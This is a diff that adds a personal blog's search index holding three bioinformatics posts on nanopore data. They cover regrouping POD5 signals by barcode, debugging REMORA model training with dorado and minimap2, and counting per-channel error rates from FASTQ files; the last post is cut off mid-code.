@@ -1,0 +1,525 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>A current signal grouping method for SQK-NBD114</title>
+    <url>/2025/02/19/29a50b437fb1/</url>
+    <content><![CDATA[<h3 id="First-get-all-reads-id-from-fastq-files"><a href="#First-get-all-reads-id-from-fastq-files" class="headerlink" title="First get all reads id from fastq files"></a>First get all reads id from fastq files</h3><p>Here we use barcode 04, 05 and 06 as examples.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fastq_dirs = &#123;</span><br><span class="line">    <span class="string">&quot;barcode04&quot;</span>: <span class="string">r&#x27;./sequencing/293T/barcode04&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;barcode05&quot;</span>: <span class="string">r&#x27;./sequencing/293T/barcode05&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;barcode06&quot;</span>: <span class="string">r&#x27;./sequencing/293T/barcode06&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pod5_id_data = &#123; <span class="string">&quot;barcode04&quot;</span>: <span class="built_in">set</span>(), <span class="string">&quot;barcode05&quot;</span>: <span class="built_in">set</span>(), <span class="string">&quot;barcode06&quot;</span>: <span class="built_in">set</span>() &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_fastq_files</span>(<span class="params">folder_path</span>):</span><br><span class="line">    folder = Path(folder_path)</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">str</span>(file) <span class="keyword">for</span> file <span class="keyword">in</span> folder.rglob(<span class="string">&#x27;*.fastq&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> barcode, fastq_dir <span class="keyword">in</span> fastq_dirs.items():</span><br><span class="line">    read_ids = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> fastq_file <span class="keyword">in</span> tqdm(find_fastq_files(fastq_dir), desc=<span class="string">f&quot;Processing <span class="subst">&#123;barcode&#125;</span>&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> record <span class="keyword">in</span> SeqIO.parse(fastq_file, <span class="string">&#x27;fastq&#x27;</span>):</span><br><span class="line">                read_ids.add(record.<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error reading <span class="subst">&#123;fastq_file&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    pod5_id_data[barcode] = read_ids</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Total read ids in <span class="subst">&#123;fastq_dir&#125;</span>: <span class="subst">&#123;<span class="built_in">len</span>(read_ids)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Then-read-POD5-files-and-store-them-by-barcodes"><a href="#Then-read-POD5-files-and-store-them-by-barcodes" class="headerlink" title="Then read POD5 files and store them by barcodes"></a>Then read POD5 files and store them by barcodes</h3><span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pod5_paths = [<span class="string">f&#x27;./pod5/PAS11791_as_an_example_<span class="subst">&#123;i&#125;</span>.pod5&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pod_idx, pod5_path <span class="keyword">in</span> <span class="built_in">enumerate</span>(pod5_paths):</span><br><span class="line">    barcode_pod5 = &#123; <span class="string">&quot;barcode04&quot;</span>: [], <span class="string">&quot;barcode05&quot;</span>: [], <span class="string">&quot;barcode06&quot;</span>: [] &#125;</span><br><span class="line">    <span class="keyword">with</span> pod5.DatasetReader(pod5_path, recursive=<span class="literal">True</span>) <span class="keyword">as</span> dataset:</span><br><span class="line">        reads = <span class="built_in">list</span>(dataset.reads())</span><br><span class="line">        <span class="keyword">for</span> read_record <span class="keyword">in</span> tqdm(reads, desc=<span class="string">f&quot;Processing <span class="subst">&#123;os.path.basename(pod5_path)&#125;</span>&quot;</span>):</span><br><span class="line">            read_id = read_record.read_id</span><br><span class="line">            <span class="keyword">for</span> barcode, id_set <span class="keyword">in</span> pod5_id_data.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(read_id) <span class="keyword">in</span> id_set:</span><br><span class="line">                    barcode_pod5[barcode].append(read_record.to_read())</span><br><span class="line">                    </span><br><span class="line">    output_pod5s = &#123;</span><br><span class="line">        <span class="string">&quot;barcode04&quot;</span>: <span class="string">f&#x27;./sequencing/293T/regrouped_pod5/barcode04/barcode04_<span class="subst">&#123;pod_idx&#125;</span>.pod5&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;barcode05&quot;</span>: <span class="string">f&#x27;./sequencing/293T/regrouped_pod5/barcode05/barcode05_<span class="subst">&#123;pod_idx&#125;</span>.pod5&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;barcode06&quot;</span>: <span class="string">f&#x27;./sequencing/293T/regrouped_pod5/barcode06/barcode06_<span class="subst">&#123;pod_idx&#125;</span>.pod5&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> barcode, output_pod5_path <span class="keyword">in</span> output_pod5s.items():</span><br><span class="line">        <span class="keyword">if</span> barcode_pod5[barcode]:</span><br><span class="line">            <span class="keyword">with</span> pod5.Writer(output_pod5_path) <span class="keyword">as</span> writer:</span><br><span class="line">                writer.add_reads(barcode_pod5[barcode])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Saved <span class="subst">&#123;<span class="built_in">len</span>(barcode_pod5[barcode])&#125;</span> reads to <span class="subst">&#123;output_pod5_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Signal extracted. File stored.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Bioinformatics</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>A debugging record of network training using REMORA</title>
+    <url>/2025/02/20/be33ec36137b/</url>
+    <content><![CDATA[<p>I use <code>dorado basecaller</code> first.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dorado basecaller hac barcode04_0.pod5 --device cuda:0  --emit-moves --emit-sam &gt; barcode04_0_calls.bam</span><br><span class="line">dorado basecaller hac barcode06_0.pod5 --device cuda:0  --emit-moves --emit-sam &gt; barcode06_0_calls.bam</span><br></pre></td></tr></table></figure>
+
+<p>And do <code>remora dataset prepare</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remora dataset prepare /data/nas-shared/zhaoxy/sequencing/293T/regrouped_pod5/barcode04/barcode04_0.pod5 /data/nas-shared/zhaoxy/sequencing/293T/regrouped_pod5/barcode04/barcode04_0_calls.bam --output-path can_chunks --refine-kmer-level-table /data/biolab-nvme-pool1/zhaoxy/kmer_models/dna_r10.4.1_e8.2_400bps/9mer_levels_v1.txt --refine-rough-rescale  --motif CG 0  --mod-base-control</span><br></pre></td></tr></table></figure>
+
+<p>And error occurs：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[13:53:48.823] Extracted 0 chunks from 960,684 reads.</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>It is suspected that it is caused by <code>--emit-sam</code>. Re-basecall and use hac.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dorado basecaller hac barcode04_0.pod5 --device cuda:0  --emit-moves &gt; barcode04_0_calls.bam</span><br><span class="line">dorado basecaller hac barcode06_0.pod5 --device cuda:0  --emit-moves &gt; barcode06_0_calls.bam</span><br></pre></td></tr></table></figure>
+
+<p>The same error still occurs after <code>remora dataset prepare</code> was performed</p>
+<p>After asking chatgpt, I learn that <a href="https://chatgpt.com/share/67b6d09c-a860-8010-b2df-bf86fc80136b">dorado’s basecaller does not contain the reference sequence</a>, and minimap2 mapping is required. So I use minimap2 for alignment, and the reference sequence is <a href="https://ftp.ncbi.nlm.nih.gov/genomes/all/GCF/000/001/405/GCF_000001405.26_GRCh38/"><code>GCF_000001405.26_GRCh38_genomic.fna</code></a>.</p>
+<p>Run as follows</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">minimap2 -ax map-ont /data/biolab-nvme-pool1/zhaoxy/HG38/GCF_000001405.26_GRCh38_genomic.fna /data/nas-shared/zhaoxy/sequencing/293T/regrouped_pod5/barcode06/barcode06_0_calls.bam</span><br></pre></td></tr></table></figure>
+
+<p>There is no output. I suspect that minimap2 cannot parse bam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">samtools fastq /data/nas-shared/zhaoxy/sequencing/293T/regrouped_pod5/barcode06/barcode06_0_calls.bam &gt; barcode06_0_reads.fastq</span><br></pre></td></tr></table></figure>
+
+<p>Then use <code>minimap2</code> normally.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">minimap2 -ax map-ont /data/biolab-nvme-pool1/zhaoxy/HG38/GCF_000001405.26_GRCh38_genomic.fna \</span><br><span class="line">    barcode06_0_reads.fastq | samtools <span class="built_in">sort</span> -o barcode06_0_calls.sorted.bam</span><br></pre></td></tr></table></figure>
+
+<p>Check quality of mapping.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ samtools flagstat barcode06_0_calls.sorted.bam</span><br><span class="line">2499617 + 0 <span class="keyword">in</span> total (QC-passed reads + QC-failed reads)</span><br><span class="line">2124344 + 0 primary</span><br><span class="line">246248 + 0 secondary</span><br><span class="line">129025 + 0 supplementary</span><br><span class="line">0 + 0 duplicates</span><br><span class="line">0 + 0 primary duplicates</span><br><span class="line">1197500 + 0 mapped (47.91% : N/A)</span><br><span class="line">822227 + 0 primary mapped (38.70% : N/A)</span><br><span class="line">0 + 0 paired <span class="keyword">in</span> sequencing</span><br><span class="line">0 + 0 read1</span><br><span class="line">0 + 0 read2</span><br><span class="line">0 + 0 properly paired (N/A : N/A)</span><br><span class="line">0 + 0 with itself and mate mapped</span><br><span class="line">0 + 0 singletons (N/A : N/A)</span><br><span class="line">0 + 0 with mate mapped to a different chr</span><br><span class="line">0 + 0 with mate mapped to a different chr (mapQ&gt;=5)</span><br></pre></td></tr></table></figure>
+
+<p>Running <code>remora dataset prepare</code> still gives an error like below (found it <a href="https://github.com/nanoporetech/remora/issues/109#issuecomment-1848614986">here</a>, I lost mine LOL), querying chatgpt shows that there is no <code>MD</code> tag in the bam file.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Indexing BAM by parent <span class="built_in">read</span> <span class="built_in">id</span>: 3383 Reads [00:00, 145643.63 Reads/s]</span><br><span class="line">[11:52:01.676] Extracting <span class="built_in">read</span> IDs from POD5</span><br><span class="line">[11:52:01.696] Found 3,383 valid BAM records. Found signal <span class="keyword">in</span> POD5 <span class="keyword">for</span> 100.00% of BAM records.</span><br><span class="line">[11:52:01.697] Making reference-anchored training data</span><br><span class="line">[11:52:01.697] Opening dataset <span class="keyword">for</span> output</span><br><span class="line">[11:52:02.158] Processing reads</span><br><span class="line">Extracting chunks: 100%|█████████████| 3383/3383 [00:00&lt;00:00, 64772.53 Reads/s]</span><br><span class="line">[11:52:19.245] Unsuccessful <span class="built_in">read</span>/chunk reasons:</span><br><span class="line"> 3,383 : No reference sequence (missing MD tag)</span><br><span class="line">[11:52:19.680] Extracted 0 chunks from 3,383 reads.</span><br><span class="line">[11:52:19.680] Label distribution:</span><br><span class="line">[11:52:19.680] Shuffling dataset</span><br><span class="line">[11:52:19.681] Done</span><br></pre></td></tr></table></figure>
+
+<p>So I decide to <code>dorado basecaller</code> to generate <code>MD</code> tag directly.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dorado basecaller fast barcode06_0.pod5 --emit-moves --reference /data/biolab-nvme-pool1/zhaoxy/polyT_proj/bonito/HG38_ref.mmi &gt; barcode06_0_calls.bam</span><br></pre></td></tr></table></figure>
+
+<p>Where the <code>.mmi</code> file is generated by</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">minimap2 -d reference.mmi reference.fasta</span><br></pre></td></tr></table></figure>
+
+<p>Results like below.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Indexing BAM by parent <span class="built_in">read</span> <span class="built_in">id</span>: 988718 Reads [00:08, 111136.05 Reads/s]</span><br><span class="line">[21:11:53.894] Extracting <span class="built_in">read</span> IDs from POD5</span><br><span class="line">[21:11:54.867] Found 960,686 valid BAM records. Found signal <span class="keyword">in</span> POD5 <span class="keyword">for</span> 100.00% of BAM records.</span><br><span class="line">[21:11:54.923] Making reference-anchored training data</span><br><span class="line">[21:11:54.924] Opening dataset <span class="keyword">for</span> output</span><br><span class="line">[21:11:55.806] Processing reads</span><br><span class="line">Extracting chunks: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 959963/959963 [02:38&lt;00:00, 6048.10 Reads/s][21:14:35.217] Unsuccessful <span class="built_in">read</span>/chunk reasons:</span><br><span class="line">900,695 : Unmapped <span class="built_in">read</span>                                                                   </span><br><span class="line">     59 : Sequence too long                                                               </span><br><span class="line">[21:14:36.123] Extracted 375,538 chunks from 960,686 reads.</span><br><span class="line">[21:14:36.125] Label distribution: control:375,538</span><br><span class="line">[21:14:36.125] Shuffling dataset</span><br><span class="line">[21:14:44.266] Done</span><br></pre></td></tr></table></figure>
+
+<p>Make config.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remora \</span><br><span class="line">  dataset make_config \</span><br><span class="line">  train_dataset.jsn \</span><br><span class="line">  can_chunks \</span><br><span class="line">  mod_chunks \</span><br><span class="line">  --dataset-weights 1 1 \</span><br><span class="line">  --log-filename train_dataset.log</span><br></pre></td></tr></table></figure>
+
+<p>Train.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remora \</span><br><span class="line">  model train \</span><br><span class="line">  train_dataset.jsn \</span><br><span class="line">  --model remora/models/ConvLSTM_w_ref.py \</span><br><span class="line">  --device 0 \</span><br><span class="line">  --chunk-context 50 50 \</span><br><span class="line">  --output-path train_results</span><br></pre></td></tr></table></figure>
+
+<p>It works anyway, though accidently. 👇</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[22:24:42.546] Start training</span><br><span class="line">DEBUG [22:24:42.587:Process-1:MainThread:data_chunks.py:2596] Dataset worker 0 using super batch offsets 235206, 3642521</span><br><span class="line">DEBUG [22:24:42.601:Process-2:MainThread:data_chunks.py:2596] Dataset worker 1 using super batch offsets 132909, 2131482</span><br><span class="line">DEBUG [22:26:24.227:MainProcess:MainThread:train_model.py:546] Saving best model after 1 epochs with val_acc 0.667724609375</span><br><span class="line">DEBUG [22:28:05.155:MainProcess:MainThread:train_model.py:546] Saving best model after 2 epochs with val_acc 0.6732177734375</span><br><span class="line">DEBUG [22:31:29.841:MainProcess:MainThread:train_model.py:546] Saving best model after 4 epochs with val_acc 0.6737060546875</span><br><span class="line">DEBUG [22:33:11.024:MainProcess:MainThread:train_model.py:546] Saving best model after 5 epochs with val_acc 0.677978515625</span><br><span class="line">DEBUG [22:36:40.797:MainProcess:MainThread:train_model.py:546] Saving best model after 7 epochs with val_acc 0.67822265625</span><br><span class="line">DEBUG [22:40:18.411:MainProcess:MainThread:train_model.py:546] Saving best model after 9 epochs with val_acc 0.6785888671875</span><br><span class="line">DEBUG [22:42:06.939:MainProcess:MainThread:train_model.py:546] Saving best model after 10 epochs with val_acc 0.678955078125</span><br><span class="line">DEBUG [22:47:37.572:MainProcess:MainThread:train_model.py:546] Saving best model after 13 epochs with val_acc 0.6790771484375</span><br><span class="line">DEBUG [23:01:59.566:MainProcess:MainThread:train_model.py:546] Saving best model after 20 epochs with val_acc 0.6798095703125</span><br><span class="line">DEBUG [23:04:08.326:MainProcess:MainThread:train_model.py:546] Saving best model after 21 epochs with val_acc 0.6807861328125</span><br><span class="line">DEBUG [23:21:54.837:MainProcess:MainThread:train_model.py:546] Saving best model after 29 epochs with val_acc 0.68115234375</span><br><span class="line">[23:45:27.898] No validation accuracy improvement after 10 epochs. Training stopped early.</span><br><span class="line">[23:45:27.898] Saving final model checkpoint</span><br><span class="line">[23:45:28.154] Done</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Bioinformatics</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>How to count the nanopore error rate from the fastq file</title>
+    <url>/2023/08/17/67482b2d150d/</url>
+    <content><![CDATA[<h2 id="Problem-Background"><a href="#Problem-Background" class="headerlink" title="Problem Background"></a>Problem Background</h2><p>Sometimes we want to figure out whether the error rate of the nanopore sequencing is equalized with different nanopore channels.</p>
+<p>So we need to group the sequenced data into different channels.</p>
+<p>But due to the format of fastq file shown below, we cannot directly obtain the channel information of the specified sequence id with module <a href="https://biopython.org/docs/1.75/api/index.html"><code>Biopython</code></a>(click to enter).</p>
+<span id="more"></span>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@060d64ce-b9f6-42db-b643-2eec557c383b runid=1cd457fdb4ffa37f23fac919b243f20470561dbf sampleid=no_sample read=<span class="number">12841</span> ch=<span class="number">141</span> start_time=<span class="number">2023</span>-07-02T14:<span class="number">36</span>:48Z</span></span><br><span class="line">TCTGTGTACTTCGTTCAGTTACGTATTGCTACTTGCCTGTCGCTCTATCTTCCGCTTTAAGACAACAAACTGGGGCTATGGTTAGGCGCGAAGCCTTTCTTTGTACCGCCTCAGTACTTAGGATCAGCGTCGTATTTAGCCTTCATGGGACCCTTGCCGGCTAGATCTGGACCGAGAAACCTCGCCTTCTACTCAACGTTTCGTCACGCCCAGTTTACGCGTACATGATCCTCCCTGTTGTAGGAGTCTGGTTTCTTCGCCTAGCAATATCAGCACCAACAGAAAAGCAATACG</span><br><span class="line">+</span><br><span class="line"><span class="comment">####$%&amp;&amp;&#x27;&#x27;&#x27;&#x27;))+5;==&gt;&gt;&lt;:9985.-../9;;&lt;;;;&lt;=1111--.;==;3*)**)&#x27;%$$&amp;-/7;@@&lt;:;98889;&lt;&gt;&gt;&gt;?@&lt;&lt;&lt;;:6677=7++)&amp;(*+3:;&lt;;;;;&lt;=333:9::;&lt;;;;;;=;;;989+(()9;&lt;===&gt;@=89988:44679::999&lt;;;&lt;:::8990,,**,1152(&#x27;&#x27;&#x27;,69::99:;=@=?@&lt;720055555733334:=&lt;:9866//000001&lt;.++,2821,,&#x27;&#x27;(+/1333336:&lt;;32188::;;&lt;&gt;CA434::;?:97556@==9:&lt;;:7,</span></span><br><span class="line"><span class="meta">@fff0126a-bbc8-<span class="number">4958</span>-bd40-571785e2838f runid=1cd457fdb4ffa37f23fac919b243f20470561dbf sampleid=no_sample read=<span class="number">10427</span> ch=<span class="number">133</span> start_time=<span class="number">2023</span>-07-02T14:<span class="number">37</span>:38Z</span></span><br><span class="line">AGCCGCGCGACGAACACGTACATTGCTACTTGCCCTGTCGCTCTATCTTCGTCCAATGAAAGCGTAGTTGCACTCAAATCCGCTTACCAGGCCTTCTTCTGAGATCCAACCATCTTCTGCTATAGGCAACGTGCCTTCTCCCACGTATCTGCTGGTACATCCGCTTGTTCGGCCTTCTTCCAAACCAGCTAATCCAATCCGATGCGTAGAGCGAAGGAACGATGATAGCTTTGGATCCCTAAGAACGGTAGCAATA</span><br><span class="line">+</span><br><span class="line">%%%%%<span class="string">&#x27;&amp;&#x27;</span>&amp;&amp;&amp;%%$$%%<span class="string">&#x27;),***,139889::?A558==4333,--;=&gt;&gt;;;;887799:99:;:9656;&lt;))))(,,--,,-/1011.+++/..&#x27;</span><span class="string">&#x27;&#x27;</span>*<span class="number">455885</span>=<span class="number">7768</span>;<span class="number">32322533</span>/))+(((()*,////<span class="number">2999888335</span>;;&lt;&gt;&lt;&lt;===&gt;=====&gt;@&lt;<span class="string">&#x27;&#x27;</span>,,(%$$$<span class="number">3</span>:;===??A///<span class="number">38</span>=;::<span class="number">8</span>:=&lt;;.---======&gt;<span class="number">654</span>++**((<span class="string">&#x27;&#x27;&#x27;&amp;+/116:&lt;;:,,+++)&#x27;&#x27;&#x27;</span>)*<span class="number">5</span>+<span class="number">1499</span>&gt;=;&lt;;;==&lt;&lt;<span class="number">64</span></span><br><span class="line"><span class="meta">@f08985df-31a8-43f0-b42c-2a805124d605 runid=1cd457fdb4ffa37f23fac919b243f20470561dbf sampleid=no_sample read=<span class="number">14188</span> ch=<span class="number">155</span> start_time=<span class="number">2023</span>-07-02T14:<span class="number">37</span>:35Z</span></span><br><span class="line">CTGTATGTACTTCGTTCAGTTACGTATTGCTACTTGCCTGTCGCTCTATCTTCCTTGAGGGAAGCCACAAGCCCAATGGACCAAGTCTCCGCCAAGGCCGAGCAACCGTACGAGAGGAATGCGCGCCCGACCACTTTCTAGGCCTGAATTTCAAAGCCGTTACGAGCGTCCTTTTAACGCGTTAGGCCACTACACCGGCTTCGGCTAAGGAACCTGTGTCTTGAGGCACGCTTCGCCTGGTCCTGTTCTTCGCCTGGTCCTGTTAGCAATATCAGCACCAACAGAAAAGCAATACGT</span><br><span class="line">+</span><br><span class="line">$$$$<span class="comment">###$&amp;1278&gt;&gt;?@1111*)))-./134558==&gt;&gt;&gt;??&gt;==&gt;=;&lt;&lt;;&lt;??=&lt;&lt;9666.-1000&#x27;&#x27;&#x27;((*89;&gt;AAA@&gt;&gt;&lt;=&lt;&lt;????&gt;?@????BB?&gt;???@@&gt;&gt;??A&gt;?&gt;&gt;=&gt;&gt;&lt;&lt;&gt;&gt;&gt;BFCA=;***)*/12)/+4368;;=&gt;@CDA875258=&gt;&gt;&gt;&gt;&lt;&lt;;;&lt;&gt;=7666&lt;&lt;;:*(()+1//0300/,,)(((&amp;&amp;&amp;&amp;%%%%&#x27;(&#x27;&amp;&amp;%%&#x27;&#x27;&#x27;(23458:5///./78:;::;;&lt;&lt;&lt;=&gt;==667BAAB??&gt;&gt;&lt;:??;;;::=:::99;;=&gt;?&gt;&gt;&gt;&gt;&gt;?@?A&gt;&lt;;:=?==3300-*</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Through observing the description of each sequence, we know that all we need to do is obtain the channel info from <code>ch=**</code>.</p>
+<p>We can use the regular expression and module <a href="https://biopython.org/docs/1.75/api/Bio.SeqIO.QualityIO.html?highlight=qualityio%20fastqgeneraliterator#Bio.SeqIO.QualityIO.FastqGeneralIterator"><code>QualityIO.FastqGeneralIterator</code></a>(click to enter) as shown below .</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(fastq_path) <span class="keyword">as</span> handle:</span><br><span class="line">    <span class="keyword">for</span> (title, sequence, quality) <span class="keyword">in</span> QualityIO.FastqGeneralIterator(handle):</span><br><span class="line">        channel = re.findall(<span class="string">r&#x27;ch=\d+&#x27;</span>, title)[<span class="number">0</span>][<span class="number">3</span>:]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Grouped-seqs-into-files"><a href="#Grouped-seqs-into-files" class="headerlink" title="Grouped seqs into files"></a>Grouped seqs into files</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> tqdm.trange(<span class="built_in">len</span>(fastq_list), desc=<span class="string">&#x27;grouping by channel...&#x27;</span>) <span class="keyword">as</span> rbar:</span><br><span class="line">    <span class="keyword">for</span> fastq <span class="keyword">in</span> fastq_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fastq_path) <span class="keyword">as</span> handle:</span><br><span class="line">            <span class="keyword">for</span> (title, sequence, quality) <span class="keyword">in</span> QualityIO.FastqGeneralIterator(handle):</span><br><span class="line">                <span class="built_in">id</span> = title.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                channel = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;ch=\d+&#x27;</span>, title)[<span class="number">0</span>][<span class="number">3</span>:])</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># check whether this seq is mapped or not</span></span><br><span class="line">                    target_name = pickle_data[<span class="built_in">id</span>][<span class="string">&#x27;T_n&#x27;</span>]</span><br><span class="line">                <span class="keyword">except</span>: </span><br><span class="line">                    <span class="comment"># this seq does not map to any barcode</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                Here are some seqs filter codes</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> pickle_data[<span class="built_in">id</span>][<span class="string">&#x27;R_s&#x27;</span>] == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                    channels[channel - <span class="number">1</span>].append(<span class="built_in">id</span>, target_index ,sequence) </span><br><span class="line">                    <span class="comment"># we need to know which barcode this seq maps to, so that we can do error rate count</span></span><br><span class="line">                <span class="keyword">else</span> pickle_data[<span class="built_in">id</span>][<span class="string">&#x27;R_s&#x27;</span>] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                    ...</span><br><span class="line">        rbar.update()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Counting-error-rate-per-channel"><a href="#Counting-error-rate-per-channel" class="headerlink" title="Counting error rate per channel"></a>Counting error rate per channel</h2><p>After writing data into files, use MUSCLE to align each query(sequence) with its own reference sequence. And finally write the result into a csv table.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tqdm, re, subprocess</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> Bio <span class="keyword">import</span> SeqIO</span><br><span class="line"></span><br><span class="line">grouping_res_path = <span class="string">r&#x27;******************************************&#x27;</span></span><br><span class="line">ref_path = <span class="string">r&#x27;***************************************************&#x27;</span></span><br><span class="line"></span><br><span class="line">all_refs = [<span class="built_in">str</span>(item.seq) <span class="keyword">for</span> idx, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(SeqIO.parse(ref_path,<span class="string">&#x27;fasta&#x27;</span>))]</span><br><span class="line"></span><br><span class="line">channel_num = <span class="number">512</span> <span class="comment"># Obtained before</span></span><br><span class="line">all_mutation_list = []</span><br><span class="line">all_insertion_list = []</span><br><span class="line">all_deletion_list = []</span><br><span class="line">all_id_list = []</span><br><span class="line">avg_mutation_list = []</span><br><span class="line">avg_insertion_list = []</span><br><span class="line">avg_deletion_list = []</span><br><span class="line">avg_id_list = []</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, channel_num+<span class="number">1</span>):</span><br><span class="line">    records = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> SeqIO.parse(grouping_res_path+<span class="string">f&#x27;grouping_channel_<span class="subst">&#123;idx&#125;</span>.fasta&#x27;</span>, <span class="string">&#x27;fasta&#x27;</span>):</span><br><span class="line">        title = <span class="built_in">str</span>(item.<span class="built_in">id</span>)</span><br><span class="line">        seq = <span class="built_in">str</span>(item.seq)</span><br><span class="line">        seq_index = <span class="built_in">int</span>(re.findall(<span class="string">f&#x27;channel=\d+&#x27;</span>, title)[<span class="number">0</span>][<span class="number">8</span>:])</span><br><span class="line">        records.append((seq_index, seq))</span><br><span class="line">    </span><br><span class="line">    mutation_list = []</span><br><span class="line">    insertion_list = []</span><br><span class="line">    deletion_list = []</span><br><span class="line">    id_list = []</span><br><span class="line">    <span class="keyword">with</span> tqdm.trange(<span class="built_in">len</span>(records), desc=<span class="string">f&#x27;getting grouped result <span class="subst">&#123;idx&#125;</span> channels&#x27;</span>) <span class="keyword">as</span> pbar:</span><br><span class="line">        <span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(records):</span><br><span class="line">            ref = all_refs[item[<span class="number">0</span>]]</span><br><span class="line">            query = item[<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(&#x27;*&#x27;)</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;temp_align.fasta&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&#x27;&gt;query\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">f&#x27;<span class="subst">&#123;query&#125;</span>\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">f&#x27;&gt;ref\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">f&#x27;<span class="subst">&#123;ref&#125;</span>\n&#x27;</span>)</span><br><span class="line">            p = subprocess.Popen((<span class="string">&#x27;muscle -align &#123;&#125; -output &#123;&#125;&#x27;</span>).<span class="built_in">format</span>(<span class="string">&#x27;temp_align.fasta&#x27;</span>, <span class="string">&#x27;temp_aligned.fasta&#x27;</span>),</span><br><span class="line">                        shell = <span class="literal">True</span>,</span><br><span class="line">                        stdout = subprocess.PIPE,</span><br><span class="line">                        stderr = subprocess.STDOUT)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>,end = <span 